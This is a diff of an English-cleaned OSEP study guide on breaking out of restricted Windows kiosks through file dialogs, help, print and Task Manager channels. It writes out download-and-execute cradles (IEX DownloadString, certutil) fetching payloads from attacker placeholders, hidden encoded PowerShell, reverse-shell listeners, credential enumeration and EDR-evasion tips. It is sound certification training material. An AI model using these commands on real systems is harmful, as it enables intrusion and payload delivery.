@@ -2,318 +2,318 @@
 For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
 :::
 
-# 14 · Scenarios 41–43: Kiosk breach · JEA unauthorized file copy · JIT time window
+# 14 · Scenarios 41–43: Kiosk breakout · JEA over-permissive file copy · JIT time window
 
-> Basis explanation: This topic has no direct entry in. The following content is based on the textbook chapter. 16 Chapter (restricted desktop / Kiosk breakthrough) and the 23 chapter（PowerShell restricted endpoint JEA with temporary authorization JIT）Organize experimental ideas and supplement general enumeration and verification methods。
+> Basis: this topic has no direct entry in the source material; the following is organized from the lab approach in the textbook's chapter 16 (restricted desktop / kiosk breakout) and chapter 23 (PowerShell restricted endpoints: JEA and just-in-time authorization JIT), plus general enumeration and validation methods.
 >
-> Writing convention: Chinese description + English commands; placeholders are unified as `LHOST` `LPORT` `TARGET` `DOMAIN` `USER` `PASS` `NTHASH` `PAYLOAD` `URL`。
+> Style convention: Chinese notes plus English commands; placeholders are unified as `LHOST` `LPORT` `TARGET` `DOMAIN` `USER` `PASS` `NTHASH` `PAYLOAD` `URL`.
 >
-> This module file：[14-kiosk-jea-jit](/modules/14-kiosk-jea-jit)、`m14-jea-file-copy.ps1`、`m14-jea-service-dll.cs`、`m14-jit-admin-window.ps1`、`m14-kiosk-breakout.md`。
+> Files in this module: [14-kiosk-jea-jit](/modules/14-kiosk-jea-jit), `m14-jea-file-copy.ps1`, `m14-jea-service-dll.cs`, `m14-jit-admin-window.ps1`, `m14-kiosk-breakout.md`.
 
-## 0. Scene Overview
+## 0. Scenario overview
 
-| scene | theme | Entrance → Target | main script |
+| Scenario | Topic | Entry → goal | Main scripts |
 |---|---|---|---|
-| 41 | Kiosk breakthrough | Restricted single application desktop → Native command execution（kiosk user level） | `m14-kiosk-breakout.md` path list |
-| 42 | JEA Over-wide file copy | restricted PowerShell endpoint (only Copy-Item Waiting for whitelist command）→ Service account code execution | `m14-jea-file-copy.ps1` + `m14-jea-service-dll.cs` |
-| 43 | JIT time window | Temporary administrator authorization → Defined commands in the window + Use of remaining bills outside the window | `m14-jit-admin-window.ps1` |
+| 41 | Kiosk breakout | Restricted single-app desktop → local command execution (kiosk user level) | `m14-kiosk-breakout.md` path checklist |
+| 42 | JEA over-permissive file copy | Restricted PowerShell endpoint (only allow-listed commands such as `Copy-Item`) → service account code execution | `m14-jea-file-copy.ps1` + `m14-jea-service-dll.cs` |
+| 43 | JIT time window | Temporary admin authorization → planned commands inside the window + use of residual tickets outside it | `m14-jit-admin-window.ps1` |
 
-Common premise: In-domain credentials have been obtained（`DOMAIN\USER` + `PASS` or `NTHASH`）and yes `TARGET` Network Reachability - Scenario 41 often RDP/physical session，42 need WinRM（5985/5986），43 need LDAP（389）or WinRM。
+Common prerequisites: you already hold domain credentials (`DOMAIN\USER` plus `PASS` or `NTHASH`) and can reach `TARGET` over the network - scenario 41 is usually an RDP or physical session, 42 needs WinRM (5985/5986), and 43 needs LDAP (389) or WinRM.
 
 ---
 
-## Scenario 41 · Kiosk Breakout Path List
+## Scenario 41 · Kiosk breakout path checklist
 
 ### Situation
-The target machine is“single application Kiosk”Pattern operation：Windows The casing is replaced or replaced with Assigned Access Locked to a certain application (browser, self-developed program、PDF reader, etc.). We can interact with it (physical terminal or RDP），But the start menu、Win+R、Task manager, open directly cmd/PowerShell All are unavailable or removed by policy. Task: Find at least one path to get**command execution**。Breakthroughs usually fall first kiosk User identity (normal permissions), subsequent rights escalation/Follow the normal process laterally (see M06/M07）。
+The target machine runs as a "single-app kiosk": the Windows shell is replaced, or Assigned Access locks it to one application (a browser, an in-house program, a PDF reader, and so on). We can interact with it (physical terminal or RDP), but the Start menu, Win+R, Task Manager, and launching cmd/PowerShell directly are all unavailable or removed by policy. Task: find at least one path to **command execution**. The breakout usually lands first in the kiosk user's identity (standard rights); escalation and lateral movement then follow the normal process (see M06/M07).
 
 ### Assumptions
-- kiosk User is a normal domain/Local users, excluding administrator rights - expected to get low rights first after breaking through shell。
-- Don't assume“All system channels are blocked”：a lot of kiosk Lock surface entry only (casing/Start menu), deep dialog channel (open/save as/Print/Help) often unblocked。
-- RDP After entering if kiosk App crashes or can be closed（Alt+F4）And retreating to the desktop is equivalent to getting directly to the desktop - test the status of the shell first, don't rush to make holes。
-- Need to be able to finally connect to the attack aircraft（`LHOST` right kiosk Reachable) or can bring out the command results。
+- The kiosk user is an ordinary domain or local user without administrator rights - after the breakout expect a low-privilege shell first.
+- Do not assume "every system channel is blocked": many kiosks lock only the obvious entries (shell/Start menu), and the deeper dialog channels (Open/Save As/Print/Help) are often left open.
+- If the kiosk app crashes or can be closed (Alt+F4) and drops you to the desktop, that is the desktop handed to you - probe the shell state first instead of rushing to drill holes.
+- You need to be able to reach the attacker machine (`LHOST` reachable from the kiosk), or to bring the command output out with you.
 
-### Prepare (attacker)
-- Start monitoring：`nc -lvnp LPORT`，or C2 listener。
-- Prepare for phase two `PAYLOAD`（PowerShell one line or executable file) and record the deliverable `URL`（HTTP/SMB）。
-- Keep your route list handy for quick reference `m14-kiosk-breakout.md`，Check items one by one。
-- If you leave RDP：Confirm clipboard/Is the local disk mapping available? (If available, delivery will be easier.）。
+### Prepare (attacker side)
+- Start a listener: `nc -lvnp LPORT`, or a C2 listener.
+- Have the stage-2 `PAYLOAD` ready (a PowerShell one-liner or an executable) and note the `URL` you can deliver over (HTTP/SMB).
+- Keep the path checklist `m14-kiosk-breakout.md` within reach and tick items off one at a time.
+- If you are going in over RDP: confirm whether clipboard and local drive mapping work (if they do, delivery is easier).
 
 ### Procedure
-according to“Cost from low to high, first silent and then dynamic”Try each channel one by one and think about each item first.**Available signals**Do it again：
+Work through the channels in order of increasing cost, quiet before loud, and decide the **success signal** for each one before you touch it:
 
-1. **Shell and application status**：Alt+Tab Are there any other windows?；Win key/Ctrl+Esc Whether to pop up the start menu；kiosk Application is closed（Alt+F4/Whether the taskbar falls to the desktop after closing)；Ctrl+Shift+Esc Whether to open the task manager。
-2. **Browser / HTML Host**（kiosk The application is tried first when it is a browser）：
-   - IE/old kernel（WebBrowser Controls are the same): address bar input `file:///C:/Windows/System32/cmd.exe` → Appear“Open/run”hint → Select Run to get cmd。
-   - Chrome/Edge：document URL It will only trigger downloading and cannot be executed directly (this is the default in modern kernels). Go to the next chapter. 3、4 class dialog channel。
-3. **Common file dialog escape**（kiosk Any within the app“Open/save as/import/Export/Attached files”Button): Modern Open/The Save As dialog box has its own address bar and file name box - address bar input `C:\Windows\System32` After pressing Enter to enter the directory, enter it in the address bar. `cmd.exe` Enter（Explorer The system dialog box will execute PATH Internal program name; if not recognized, enter the full path）。**This is the most common and often missed channel。**
-4. **Print/Export dialog**：any“print to PDF / Save as PDF / Export report”Each entry has a file dialog box, the same as Chapter 1 3 multiplexing。
-5. **Help system**：application“help”If .chm Open（hh.exe window），CHM Inside“Jump URL/shortcut”Can point to external programs; if the help is opened in the browser → Back to Chapter 2 strip。
-6. **Accessibility / input method**：Win+U Play when available“Easy to use”，its link (narrator/On-screen keyboard) can sometimes bring up the system interface; on-screen keyboard often Win key virtual key。
-7. **task manager channel**：Ctrl+Shift+Esc → document → Run new task → enter `cmd`。Ruo Dan UAC It means that this operation is requesting privilege escalation and changing user-level channels (Task Manager“Run new task”It is not always possible to escalate privileges for the current user. It is worth trying.）。
-8. **Immediately solidify the scene after receiving the order and executing it**：Write the channel and reproduction steps into the list, then pop back shell（See verification) to avoid repeated entry and exit。
+1. **Shell and application state**: does Alt+Tab show other windows; does the Win key / Ctrl+Esc open the Start menu; does closing the kiosk app (Alt+F4 / close from the taskbar) drop you to the desktop; does Ctrl+Shift+Esc open Task Manager.
+2. **Browser / HTML host** (try this first when the kiosk app is a browser):
+   - IE / old engine (same for the WebBrowser control): type `file:///C:/Windows/System32/cmd.exe` in the address bar → an "Open/Run" prompt appears → choose Run and you have cmd.
+   - Chrome/Edge: a file URL only triggers a download and cannot execute directly (that is the modern default), so move on to the dialog channels in items 3 and 4.
+3. **Generic file dialog escape** (any "Open/Save As/Import/Export/Attach file" button inside the kiosk app): the modern Open/Save dialog has its own address bar and file name box - type `C:\Windows\System32` in the address bar and press Enter to enter the directory, then type `cmd.exe` in the address bar and press Enter (Explorer-family dialogs execute program names found on PATH; if it does not recognize the name, type the full path). **This is the most common channel and the one most often left unblocked.**
+4. **Print/export dialogs**: any "Print to PDF / Save as PDF / Export report" entry carries a file dialog, so reuse item 3.
+5. **Help system**: if the app's "Help" opens as a .chm (an hh.exe window), the "jump URL/shortcut" entries inside the CHM can point at an external program; if Help opens in the browser → go back to item 2.
+6. **Accessibility / input method**: if Win+U works it opens Ease of Access, and its links (Narrator/on-screen keyboard) sometimes surface the system UI; the on-screen keyboard usually carries a virtual Win key.
+7. **Task Manager channel**: Ctrl+Shift+Esc → File → Run new task → type `cmd`. If UAC appears, the operation is requesting elevation - switch to a user-level channel (Task Manager's "Run new task" does not always elevate for the current user, so it is worth trying).
+8. **As soon as you have command execution, solidify the position**: write the channel and the reproduction steps into the checklist, then pop back to your shell (see Validation) rather than walking in and out repeatedly.
 
 ### Scripts used
-- `m14-kiosk-breakout.md`：A quick check of the route list by channel, including each“Available signals / Blocked features / Remark”，Used to check items one by one on site。
+- `m14-kiosk-breakout.md`: per-channel path checklist with the "success signal / blocked signature / notes" for every entry, used to tick items off on site.
 
 ### Validation
-- Backlink occurs：`nc -lvnp LPORT` A connection is received; or the command echo is visible。
-- exist shell Confirm identity and network here：`whoami`（should be kiosk user）、`ipconfig`、`netstat -ano`、`cmdkey /list`、`dir %APPDATA%\Microsoft\Credentials`。
-- If you just get it“In-dialog file system access”rather than complete shell，The verification standard is“Can it be reproduced stably without interruption? kiosk business”。
-- Record integrity level：`whoami /groups | findstr /i "Mandatory Integrity"`——Determine whether the next step is to escalate privileges or directly go horizontally。
+- A callback arrives: `nc -lvnp LPORT` receives a connection, or command output is visible.
+- From the shell, confirm identity and network: `whoami` (should be the kiosk user), `ipconfig`, `netstat -ano`, `cmdkey /list`, `dir %APPDATA%\Microsoft\Credentials`.
+- If all you have is file-system access inside a dialog rather than a full shell, the bar is "can you reproduce it reliably without disrupting the kiosk business".
+- Record the integrity level: `whoami /groups | findstr /i "Mandatory Integrity"` - that tells you whether the next step is escalation or direct lateral movement.
 
 ### Failure branches and alternatives
-- **Open/All save as dialog boxes are blocked by policy**：Trial print dialog box, error dialog box (triggered intentionally kiosk Application error reporting, often with“View log/Details/open location”class link); or on-screen keyboard/touch keyboard Win key。
-- **The browser only downloads but does not execute**：After downloading use 3 The dialog box channel locates the download directory and then executes it; or delivers `.hta`/`.lnk` Wait for the file to be opened by the system handler, and then look for the dialog box from the handler/Jump channel。
-- **All user-level channels are blocked**：Return to the system level entry - if physical access is available, consider the boot sequence/Firmware (beyond the scope of common exams）；RDP kiosk Can be disconnected and reconnected to observe the pre-login interface (auxiliary function entrance sethc/utilman This is a pre-login scenario and requires the system disk to be writable. See M06 Ideas）。
+- **Open/Save As dialogs are all blocked by policy**: try the print dialog, an error dialog (deliberately trigger a kiosk app error, which often carries "View log/Details/Open location" links); or the Win key on the on-screen/touch keyboard.
+- **The browser only downloads, never executes**: after the download, use the item 3 dialog channel to navigate to the download directory and execute from there; or deliver a file that a system handler opens (`.hta`/`.lnk`) and hunt for a dialog/jump channel from inside that handler.
+- **All user-level channels are blocked**: fall back to system-level entries - with physical access, consider the boot order/firmware (beyond the usual exam scope); an RDP kiosk can be disconnected and reconnected to watch the pre-login interface (accessibility entries such as sethc/utilman belong to the pre-login scenario and need a writable system disk - see the M06 approach).
 
 ### Exam / OPSEC notes
-- per channel**Just try it once**：Trial and error will result in shell/EDR Leaves a lot of suspicious interactions; try silent dialog classes first (no process behavior），shell Try not to fall off the market before rebounding。
-- bomb cmd The window may flash by: combine the two phases into one command（`cmd /c powershell -nop -w hidden -enc <PAYLOAD>`）Reduce window dwell time。
-- Prioritize memory channels after breakthrough（PowerShell reflection / Add-Type memory loading), do not kiosk writable directory exe。
-- Keep a record of ticking off the checklist: hand in the report to make it clear“Which channels are open, which ones are blocked, and steps to reproduce”。
+- **Try each channel once**: repeated probing leaves a lot of suspicious interaction in the shell/EDR; start with the quiet dialog-type channels (no process behavior) and avoid touching disk before your shell comes back.
+- A cmd window that pops up can flash past: fold the stage-2 into a single command (`cmd /c powershell -nop -w hidden -enc <PAYLOAD>`) to cut the window's dwell time.
+- After the breakout prefer memory-only channels (PowerShell reflection / Add-Type in-memory loading); do not drop an exe in a kiosk-writable directory.
+- Keep the checklist ticked: the report must state clearly which channels worked, which were blocked, and the reproduction steps.
 
 ---
 
 #### `m14-kiosk-breakout.md` {#m14-kiosk-breakout-md}
 
 ````markdown
-# Kiosk Breakout Path Checklist (Scenario 41)
+# Kiosk breakout path checklist (Scenario 41)
 
-> Usage: restricted Kiosk Desktop (single app / Assigned Access / Under Replace Shell), check each item"Can I get the order to execute?"channel list，
+> Purpose: a tick-box checklist of the channels that can give you command execution on a restricted kiosk desktop (single app / Assigned Access / replaced shell),
 >
-> And how to stabilize the situation after obtaining the execution opportunity payload。
+> and of how to turn an execution opportunity into a stable payload.
 >
-> scene：41（only restricted Kiosk Desktop, no terminal）
+> Scenario: 41 (restricted kiosk desktop only, no terminal)
 >
-> Dependencies: physical terminal or RDP Interaction; the attack machine side has started monitoring（`nc -lvnp LPORT`）And prepare for the second stage `PAYLOAD` For delivery `URL`
+> Dependencies: physical terminal or RDP interaction; a listener already running on the attacker side (`nc -lvnp LPORT`) plus a stage-2 `PAYLOAD` and a delivery `URL`
 >
-> Use: press on site"Cost from low to high, first silent and then dynamic"Test item by item, each item**Just try it once**，Check the result §5 In the list (the report must clearly indicate which ones are accessible and which ones are blocked)）
+> Use: work through it on site in order of increasing cost, quiet before loud, and **try each item once**; record the result in the §5 checklist (the report must state which channels worked and which were blocked)
 >
-> placeholder：`LHOST`（attack aircraft IP）、`LPORT`（listening port）、`TARGET`（target machine）、`USER`（kiosk Account）、`URL`（Delivery address）、`PAYLOAD`（Payload file name）
+> Placeholders: `LHOST` (attacker IP), `LPORT` (listener port), `TARGET` (target host), `USER` (kiosk account), `URL` (delivery address), `PAYLOAD` (payload file name)
 >
-> Test status: Operation notes, no executable code; all commands need to be checked against the actual version in the experimental environment (especially the browser kernel and Edge/Chrome Strategy）
+> Test status: operational notes, no executable code; every command must be checked against the actual version in the lab (especially the browser engine and the Edge/Chrome policies)
 
 ---
 
-## 1. Confirm the restricted form first (don’t rush to drill holes)
+## 1. Confirm the shape of the restriction first (do not rush to drill holes)
 
-| Things to confirm | How to confirm | How to use conclusion |
+| What to confirm | How to confirm | How to use the answer |
 |---|---|---|
-| yes"Single Application Kiosk"still"restricted shell" | Win key / Ctrl+Esc / Ctrl+Alt+Del / Alt+F4 | Alt+F4 turn off kiosk Applications can be dropped to the desktop = Take it directly to the desktop, no need to drill holes later |
-| Are there any other windows? | Alt+Tab、task bar | There is residue Explorer/dialog box = Find it first"open/save as" |
-| Is task manager available? | Ctrl+Shift+Esc | Available → Walk §2.7（document → Run new task） |
-| Is there a file dialog box | In-app"Open/Save As/Import/Export/Attach File/Print"button | have → §2.2 Is the most common and most commonly missed channel |
-| Is there a writable location? | User directory、`%TEMP%`、Browser download directory | Decide whether to place the order; if not, use the pure memory channel |
+| Single-app kiosk or restricted shell | Win key / Ctrl+Esc / Ctrl+Alt+Del / Alt+F4 | Alt+F4 closes the kiosk app and lands on the desktop = you already have the desktop, no breakout needed |
+| Any other windows | Alt+Tab, taskbar | Leftover Explorer/dialog = look there first for "Open/Save As" |
+| Is Task Manager available | Ctrl+Shift+Esc | Available → use §2.7 (File → Run new task) |
+| Are there file dialogs | In-app "Open/Save As/Import/Export/Attach file/Print" buttons | Present → §2.2, the most common and most often unblocked channel |
+| Is there a writable location | User profile, `%TEMP%`, browser download directory | Decides whether you can touch disk; if not, go memory-only |
 
 ---
 
-## 2. Channel list
+## 2. Channel checklist
 
-### 2.1 Browser address bar `file://` (kiosk application is tried first when the browser is used)
+### 2.1 Browser address bar `file://` (try first when the kiosk app is a browser)
 
-| Kernel | operate | Available signals | Blocked features |
+| Engine | Action | Success signal | Blocked signature |
 |---|---|---|---|
-| IE / WebBrowser Control (same as kernel） | Address bar input `file:///C:/Windows/System32/cmd.exe` → pop up"open/save"hint → select**run** | pop up directly cmd window | The tooltip is disabled by policy / Just let save |
-| Chrome / Edge（modern kernel） | Same as above | **It will only trigger the download, but not execute it.**（Default behavior） | Download completed → change §2.2 Use the file dialog box to navigate to the download directory and then execute it. |
-| any kernel | `file:///C:/Windows/System32/` Browse catalog | Able to list = Have at least file system browsing rights | hint"Unable to access" = document URL blocked |
+| IE / WebBrowser control (same engine) | Type `file:///C:/Windows/System32/cmd.exe` in the address bar → an "Open/Save" prompt appears → choose **Run** | A cmd window opens directly | The prompt bar is disabled by policy / only Save is offered |
+| Chrome / Edge (modern engine) | Same as above | **Only triggers a download, never executes** (default behavior) | Download completes → go to §2.2, use the file dialog to reach the download directory and execute from there |
+| Any engine | Browse `file:///C:/Windows/System32/` | Directory listing works = you have at least file-system browse rights | "Cannot access" = file URLs are blocked |
 
-> Alternate entrance：`about:` Links on the page, developer tools（F12，If not banned）、"Print"entrance (see §2.4）。
+> Alternate entry points: links on `about:` pages, developer tools (F12, if not disabled), the "Print" entry (see §2.4).
 
-### 2.2 Common file dialog box (Open/Save As/Import/Export/Attach File)
+### 2.2 Generic file dialogs (Open / Save As / Import / Export / Attach file)
 
-**The most common and often missed channels. ** The modern open/save dialog box has its own address bar and file name box:
+**The most common channel, and the one most often left unblocked.** The modern Open/Save dialog has its own address bar and file name box:
 
 ```text
-1) Click on any"Open/Save As/Import/Export/Attach File"button
-2) Address bar input  C:\Windows\System32   Enter   → Enter this directory
-3) Address bar input  cmd.exe                Enter   → Explorer The system dialog box will execute PATH Internal program name
-   （If the program name is not recognized, enter the full path. C:\Windows\System32\cmd.exe）
-4) Or enter the file name box \\LHOST\share\PAYLOAD Direct execution SMB files on the network (out of the network/When the share is reachable）
+1) Click any "Open/Save As/Import/Export/Attach file" button
+2) Type  C:\Windows\System32   in the address bar and press Enter   → you land in that directory
+3) Type  cmd.exe               in the address bar and press Enter   → Explorer-family dialogs execute program names found on PATH
+   (if the name is not recognized, type the full path C:\Windows\System32\cmd.exe)
+4) Or type \\LHOST\share\PAYLOAD in the file name box to execute a file straight off SMB (when egress/the share is reachable)
 ```
 
-| Available signals | Blocked features | Remark |
+| Success signal | Blocked signature | Notes |
 |---|---|---|
-| The address bar is editable and jumps successfully | Address bar read only / You can only click on the directory tree | The directory tree can also be walked System32，Then enter in the file name box `cmd.exe` |
-| Pop up after carriage return cmd window | Double-click the file to be"Open method"strategic block | Change `.bat`/`.cmd`/`.exe` Try them all once；`.lnk` Also available |
+| The address bar is editable and navigation works | Address bar read-only / directory tree only | The directory tree also reaches System32, then type `cmd.exe` in the file name box |
+| Pressing Enter opens a cmd window | Double-clicking files is stopped by an "Open with" policy | Try `.bat`/`.cmd`/`.exe` each once; `.lnk` works too |
 
 ### 2.3 Help → View (Help menu / hh.exe / .chm)
 
 ```text
-1) application"help"menu → If .chm Open（hh.exe window）：
-   - CHM Inside"Jump to URL / shortcut"Can point to external programs
-   - hh.exe Right click in the window → View source / Print → will bring up the file dialog box (return to §2.2）
-2) If help opens in browser → return to §2.1/§2.2
-3) help window"Options → View/Open"button also drops into the file dialog box
+1) App "Help" menu → if it opens as a .chm (an hh.exe window):
+   - The "jump to URL / shortcut" entries inside the CHM can point at an external program
+   - In the hh.exe window, right-click → View source / Print → this brings up a file dialog (back to §2.2)
+2) If Help opens in the browser → back to §2.1/§2.2
+3) The Help window's "Options → View / Open" buttons also land in a file dialog
 ```
 
-| Available signals | Blocked features | Remark |
+| Success signal | Blocked signature | Notes |
 |---|---|---|
-| .chm The window appears and can be right-clicked | Help menu is grayed out / An error is reported when opening | The error dialog box itself is also a channel (see §2.8） |
+| A .chm window opens and right-click works | Help menu grayed out / error on open | The error dialog itself is also a channel (see §2.8) |
 
-### 2.4 Print/Export Dialog (Print to PDF/Save PDF As/Export Report)
+### 2.4 Print/export dialogs (print to PDF / save as PDF / export report)
 
 ```text
-1) arbitrary"Print"Entrance（Ctrl+P）→ choose"Save as PDF"/"Print to PDF"/"Export"
-2) pop up"save as"dialog box = Standard file dialog → Completely reusable §2.2 practices
-3) Often in the print preview window"Open/Save/Find"Button, also with dialog box
+1) Any "Print" entry (Ctrl+P) → choose "Save as PDF"/"Print to PDF"/"Export"
+2) The "Save as" dialog that appears = a standard file dialog → reuse §2.2 exactly
+3) The print preview window usually has "Open/Save/Find" buttons that also carry a dialog
 ```
 
-| Available signals | Blocked features | Remark |
+| Success signal | Blocked signature | Notes |
 |---|---|---|
-| Appear"Save as PDF"file dialog | No printing permission / Printer driver removed | try out"Export to XPS/CSV/Image"Wait for other export entrances |
+| A "Save as PDF" file dialog appears | No print permission / printer driver removed | Try other export entries such as "Export to XPS/CSV/Image" |
 
-### 2.5 Installed applications (programs in the whitelist)
+### 2.5 Installed applications (programs on the allow-list)
 
-| application | Breakthrough | fall to the action of execution |
+| Application | Breakout point | Action that reaches execution |
 |---|---|---|
-| Notepad（Notepad） | document → **Open** / **save as** → path bar | Path field `C:\Windows\System32`，File name box input `cmd.exe` Enter |
-| Notepad | help → about/Feedback link (some versions include http Link） | Link opens in browser → return §2.1 |
-| WordPad | document → Open →"Insert object"/file dialog | same §2.2；The inserted object can point to the executable file |
-| mspaint（Draw a picture） | document → Open / save as | same §2.2 |
-| calc（calculator） | help → about → Link (old version）/ Navigation menu | old version"about"inside http The link can activate the browser; the new version is basically unsolvable, so use other applications. |
-| PDF reader | open file / Save a copy / Print / appendix | All three places have file dialog boxes |
-| Browser | Download catalog + File dialog; download items"show in folder" | After displaying Explorer window → Enter the address bar `cmd.exe` |
-| file is linked to Office Viewer | Open → Macro/objects (majority kiosk Macros banned） | If macros are disabled, just use the file dialog |
-| cmd / PowerShell allowed | It’s already a terminal, no need to break through | Direct execution §3 |
+| Notepad | File → **Open** / **Save As** → path bar | Type `C:\Windows\System32` in the path bar, type `cmd.exe` in the file name box and press Enter |
+| Notepad | Help → About/Feedback link (some versions carry an http link) | The link opens in the browser → back to §2.1 |
+| WordPad | File → Open → "Insert object"/file dialog | Same as §2.2; the inserted object can point at an executable |
+| mspaint (Paint) | File → Open / Save As | Same as §2.2 |
+| calc (Calculator) | Help → About → link (old versions) / navigation menu | On old versions the http link in "About" can launch the browser; newer versions are basically a dead end, so use another app |
+| PDF reader | Open file / Save a copy / Print / Attachments | Every one of these carries a file dialog |
+| Browser | Download directory + file dialog; "Show in folder" on a download | That opens an Explorer window → type `cmd.exe` in the address bar |
+| Files associated with an Office viewer | Open → macro/object (most kiosks have macros disabled) | If macros are disabled, just use its file dialog |
+| cmd / PowerShell allowed | You already have a terminal, no breakout needed | Go straight to §3 |
 
-### 2.6 Accessibility/Input Method
+### 2.6 Accessibility / input method
 
-| operate | Available signals | Remark |
+| Action | Success signal | Notes |
 |---|---|---|
-| Win+U（Ease of use center） | Pop-up panel with Narrator/On-screen keyboard link | Narrator window sometimes has"Open"Entrance |
-| On-screen keyboard（osk） | On the keyboard there is Win key virtual key | Can try Win+R / Win+E；a lot of kiosk Only lock the outer shell, not here |
-| touch keyboard / Input method bar | Can bring up the input method settings window | Settings window always appears"Open location/browse"button |
+| Win+U (Ease of Access Center) | A panel opens with Narrator / on-screen keyboard links | The Narrator window sometimes carries an "Open" entry |
+| On-screen keyboard (osk) | The keyboard has a virtual Win key | Try Win+R / Win+E; many kiosks only lock the shell, not this |
+| Touch keyboard / IME bar | Can open the input-method settings window | The settings window usually carries "Open location/Browse" buttons |
 
 ### 2.7 Task Manager
 
 ```text
-Ctrl+Shift+Esc → document → Run new task → enter cmd（or powershell）
+Ctrl+Shift+Esc → File → Run new task → type cmd (or powershell)
 ```
 
-| Available signals | Blocked features | Remark |
+| Success signal | Blocked signature | Notes |
 |---|---|---|
-| "Run new task"Available and starting from the current user cmd | bomb UAC Description is requesting privilege escalation → Change user level channel | This will only be considered when all user-level channels are blocked. UAC route (see M06） |
+| "Run new task" works and starts cmd as the current user | UAC appears, meaning it is requesting elevation → switch to a user-level channel | Only consider the UAC route when every user-level channel is blocked (see M06) |
 
-### 2.8 Error dialog box (triggered on purpose)
+### 2.8 Error dialogs (triggered on purpose)
 
-deliberately let kiosk Application errors (malformed input, oversized files, disconnection operations), error boxes often appear"View Log/Details/Open Location/Export Diagnostics"，
-These buttons ultimately fall into the file dialog box or Explorer window。
+Deliberately make the kiosk app fail (malformed input, an oversized file, an operation while offline). The error box usually carries "View log / Details / Open location / Export diagnostics",
+and those buttons all end up in a file dialog or an Explorer window.
 
 ---
 
-## 3. After getting the execution opportunity: solidify the opportunity into a stable shell
+## 3. After you get an execution opportunity: turn it into a stable shell
 
-**Principle: Silence (memory) first and then load the disk; the commands are pre-assembled, and the window can be completed in a flash. **
+**Principle: quiet (memory) before disk; pre-assemble the commands so they still complete when the window flashes past.**
 
 ```bat
-:: ① One command takes shape（cmd It doesn’t matter if it passes by in a flash, reduce the window dwell time）
-cmd /c powershell -nop -w hidden -enc <PAYLOADofBase64>
+:: ① One command, fully formed (it does not matter if cmd flashes past - less dwell time)
+cmd /c powershell -nop -w hidden -enc <Base64 of PAYLOAD>
 
-:: ② Download and execute in memory (without dropping to disk)，kiosk Writable directories are not placed exe）
+:: ② Download and execute in memory (nothing touches disk; no exe in a kiosk-writable directory)
 powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('URL/s.ps1')"
 
-:: ③ When it is necessary to download the disk, use the system's own downloader, which takes priority. %TEMP%
+:: ③ When you must touch disk, use the built-in downloader and prefer %TEMP%
 certutil -urlcache -split -f URL/PAYLOAD %TEMP%\PAYLOAD && %TEMP%\PAYLOAD
 
-:: ④ Immediately confirm your identity and network after reconnecting (decide whether the next step is to escalate privileges or directly go horizontally)）
+:: ④ Immediately after the callback, confirm identity and network (it decides whether the next step is escalation or direct lateral movement)
 whoami & hostname & ipconfig & netstat -ano & cmdkey /list
-whoami /groups | findstr /i "Mandatory"      :: Look at the integrity level：Medium=Need to elevate rights，High=promoted
+whoami /groups | findstr /i "Mandatory"      :: check the integrity level: Medium = needs elevation, High = already elevated
 dir %APPDATA%\Microsoft\Credentials
 ```
 
-> `PAYLOAD` Fill in when generating `LHOST`/`LPORT`；Attack aircraft maintain `nc -lvnp LPORT` Normally open。
+> Fill in `LHOST`/`LPORT` when you generate `PAYLOAD`; keep `nc -lvnp LPORT` running on the attacker machine.
 >
-> kiosk Scenarios that will be restored every time you restart: Don’t rely on persistence, complete it once in the current session。
+> On a kiosk that reverts on every reboot: do not rely on persistence, finish everything inside the current session.
 
 ---
 
-## 4. Failed branch
+## 4. Failure branches
 
-1. **Open/All save as dialog boxes are blocked by policy** → print dialog（§2.4）、error dialog（§2.8）、On-screen keyboard Win key（§2.6）。
-2. **The browser only downloads but does not execute** → Download and use §2.2 Navigate to the download directory for execution; or post the file opened by the system handler（`.hta`/`.lnk`/`.chm`），
-   Then look for the dialog box from the handler/Jump channel。
-3. **All user-level channels are blocked** → System-level entry (boot sequence when physically exposed/Firmware, beyond the scope of common exams）；
-   RDP kiosk You can disconnect and reconnect, and observe the pre-login interface (the auxiliary function entrance belongs to the pre-login scene, and the system disk must be writable, see M06）。
-4. **Writing the startup directory is ACL reject** → Change `%TEMP%`/User directory; if you can create a scheduled task, just trigger the scheduled task。
-5. **Kiosk Restore every reboot** → Give up persistence and complete all actions within the current session。
+1. **Open/Save As dialogs are all blocked by policy** → the print dialog (§2.4), error dialogs (§2.8), the Win key on the on-screen keyboard (§2.6).
+2. **The browser only downloads, never executes** → after downloading, use §2.2 to reach the download directory and execute there; or deliver a file that a system handler opens (`.hta`/`.lnk`/`.chm`),
+   and then hunt for a dialog/jump channel from inside that handler.
+3. **All user-level channels are blocked** → system-level entries (boot order/firmware when you have physical access, beyond the usual exam scope);
+   an RDP kiosk can be disconnected and reconnected to observe the pre-login interface (accessibility entries belong to the pre-login scenario and need a writable system disk, see M06).
+4. **Writing to the Startup directory is denied by ACL** → switch to `%TEMP%`/the user profile; if you can create a scheduled task, trigger through that instead.
+5. **The kiosk reverts on every reboot** → give up on persistence and finish every action inside the current session.
 
 ---
 
-## 5. On-site check list
+## 5. On-site tick list
 
 ```text
-[ ] Alt+F4 / Whether to close the application and drop it to the desktop        [ ] Win key / Ctrl+Esc Whether to pop up the start menu
-[ ] Ctrl+Shift+Esc task manager            [ ] document → Run new task → cmd
+[ ] Alt+F4 / closing the app drops you to the desktop        [ ] Win key / Ctrl+Esc opens the Start menu
+[ ] Ctrl+Shift+Esc Task Manager            [ ] File → Run new task → cmd
 [ ] Browser address bar file:///C:/Windows/System32/cmd.exe    [ ] Open dialog address bar → cmd.exe
-[ ] Save as dialog box → cmd.exe               [ ] Print/Export PDF → Save as dialog box
-[ ] help → Check / hh.exe / .chm          [ ] Installed app：Notepad / WordPad / mspaint / calc / PDF
-[ ] Win+U Easy to use / On-screen keyboard Win key      [ ] Deliberately triggering an error → View log/open location
-[ ] The execution opportunity has been solidified (reconnection successful) / The command echo is visible）
-[ ] Records: open channels, blocked channels, recurrence steps (reports should be written）
+[ ] Save As dialog → cmd.exe               [ ] Print/Export PDF → Save As dialog
+[ ] Help → View / hh.exe / .chm          [ ] Installed apps: Notepad / WordPad / mspaint / calc / PDF
+[ ] Win+U Ease of Access / on-screen keyboard Win key      [ ] Deliberately trigger an error → View log/Open location
+[ ] Execution opportunity solidified (callback succeeded / command output visible)
+[ ] Recorded: working channels, blocked channels, reproduction steps (goes in the report)
 ```
 
 ---
 
-## 6. OPSEC reminder
+## 6. OPSEC reminders
 
